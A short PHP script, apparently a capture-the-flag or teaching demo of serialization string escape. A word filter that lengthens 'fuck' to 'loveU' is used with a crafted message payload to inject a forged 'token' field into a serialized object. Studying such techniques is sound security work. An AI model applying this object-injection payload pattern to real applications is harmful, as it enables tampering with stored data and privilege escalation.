<?php
    class message
    {
        public $from;
        public $to;
        public $msg;
        public $token = 'admin';
        public function __construct($f, $m, $t)
        {
            $this->from = $f;
            $this->msg = $m;
            $this->to = $t;
        }
    }

    function filter($msg)
    {
        return str_replace('fuck', 'loveU', $msg);
    }

    $msg = new message('a', 'b', 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:4:"admin";}');
    $umsg = serialize($msg);
    echo filter($umsg);
?>
